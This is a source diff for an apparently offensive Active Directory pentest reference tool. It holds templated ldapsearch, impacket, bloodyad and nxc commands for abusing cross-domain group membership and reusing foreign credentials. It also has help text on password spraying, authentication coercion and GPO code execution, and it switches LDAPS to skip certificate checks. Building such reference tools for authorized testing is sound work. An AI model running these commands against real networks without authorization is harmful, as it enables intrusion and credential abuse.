 R({id:'trust-foreign-groups',cat:'trust',title:'Foreign group membership',desc:'Users from a trusted domain can be members of your groups (and vice versa) — their own credentials then work against your resources.',
 cmds:[
- [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=ForeignSecurityPrincipals,{{domain_dn}}' '(objectClass=foreignSecurityPrincipal)' cn,objectSid`,'foreign SIDs present in this domain'],
+ [`LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=ForeignSecurityPrincipals,{{domain_dn}}' '(objectClass=foreignSecurityPrincipal)' cn,objectSid`,'foreign SIDs present in this domain'],
  [`impacket-lookupsid '{{domain}}/{{user}}:{{password}}@{{trust_dc_ip}}'`,'resolve SIDs against the trusted DC'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get membership '{{user}}'`,'your own (possibly foreign) group memberships'],
  [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{group}}' --attr member`,'inspect a group for foreign SIDs'],
  [`nxc smb {{trust_domain}} -d {{trust_domain}} -u '<FOREIGN_USER>' -p '<PASSWORD>'`,'use credentials from the owning domain against this one'],
  [`nxc ldap {{trust_domain}} -d {{trust_domain}} -u '<FOREIGN_USER>' -p '<PASSWORD>' --groups`,'enumerate as the foreign user']
-],note:'Two directions: (1) foreign principals nested in <b>your</b> groups are an entry path for credentials from their home domain; (2) your user nested in a foreign group grants you access there. BloodHound shows both via the "Foreign group members (cross-domain)" query in the BloodHound tab. Memberships only translate into access where the resource domain accepts the authenticating user.'});
+],note:'Two directions: (1) foreign principals nested in <b>your</b> groups are an entry path for credentials from their home domain; (2) your user nested in a foreign group grants you access there. BloodHound shows both via the "Foreign group members (cross-domain)" query in the BloodHound tab. Memberships only translate into access where the resource domain accepts the authenticating user.<br>The lookup runs over <b>LDAPS (636)</b> with <span class="mono">LDAPTLS_REQCERT=never</span>; fallback: <span class="mono">-H ldap://{{dc_ip}} -ZZ</span> (STARTTLS) — see the LDAP over TLS card.'});
 
 /* ===== BLOODHOUND COLLECTION ===== */
 R({id:'bh-python',cat:'bh',title:'bloodhound-python collection',desc:'Collect from Linux — all the data needed for pathfinding.',
@@ -2889,7 +2903,9 @@ const HELP_TOOL = {
  'kerbrute': 'Kerberos brute-force toolkit: userenum via pre-auth error codes (no lockout) and password spraying.',
  'coercer': 'Fires every known authentication-coercion vector at a target and points it to a listener.',
  'ldapdomaindump': 'Dumps users, groups, computers, ACLs and password policy to HTML/JSON/CSV for offline browsing.',
- 'ldapsearch': 'Generic LDAP query tool — for attribute searches that other tooling does not cover.',
+ 'ldapsearch': 'Generic LDAP query tool — for attribute searches that other tooling does not cover. Prefer LDAPS: <span class="mono">-H ldaps://&lt;dc&gt;</span> with <span class="mono">LDAPTLS_REQCERT=never</span> (see the LDAP over TLS card).',
+ 'nmap': 'Port scanner — here used to check which LDAP listeners (389/636/3268/3269) a DC offers before choosing LDAPS or STARTTLS.',
+ 'openssl': 'TLS toolbox: <span class="mono">s_client</span> connects to a service and shows the certificate chain — used to grab/trust the DC certificate for LDAPS.',
  'pygpoabuse.py': 'Modifies a GPO you can write to and pushes an immediate scheduled task — GPO-based code execution.',
  'sccmhunter.py': 'SCCM/MECM post-exploitation toolkit: discover site systems, check signing, abuse client enrollment and MSSQL takeover paths.',
  'zerologon_tester.py': 'Checks whether a DC is vulnerable to CVE-2020-1472 (unpatched Netlogon). Non-destructive.',
@@ -3069,7 +3085,7 @@ function zshEmit(data){
   const fnName = n => '_hk_' + n.replace(/[^A-Za-z0-9_]/g, '_');
   const q = s => "'" + String(s).replace(/'/g, "'\\''") + "'";
   let out = '#compdef ' + names.concat(Object.keys(aliases)).join(' ') + '\n';
-  out += '# Hackerman v1.12.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
+  out += '# Hackerman v1.13.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
   out += '_hackerman() {\n  local tool=${words[1]:t}\n  case $tool in\n';
   names.forEach(n => { out += '    ' + n + ') ' + fnName(n) + ' ;;\n'; });
   Object.keys(aliases).forEach(a => { out += '    ' + a + ') ' + fnName(aliases[a]) + ' ;;\n'; });
@@ -3124,7 +3140,7 @@ const REQ_DEFS = {
 const REQS = {
   'auth-check':['creds'], 'pth-check':['creds'], 'kerb-check':['creds','artifact'], 'shares':['creds'],
   'user-enum':['creds'], 'anon-enum':['nocreds'], 'kerbrute':['nocreds'], 'pw-spray':['nocreds'],
-  'session-hunt':['localadmin','creds'], 'ldap-dump':['creds'],
+  'session-hunt':['localadmin','creds'], 'ldap-dump':['creds'], 'ldap-tls':['nocreds','creds'],
   'bloodyad-basics':['creds'], 'bloodyad-writable':['creds'], 'bloodyad-spn':['creds','dacl'],
   'bloodyad-password':['creds','dacl'], 'bloodyad-uac':['creds','dacl'], 'bloodyad-groups':['creds','dacl'],
   'bloodyad-enum':['creds'], 'bloodyad-badsuccessor':['creds','role'],
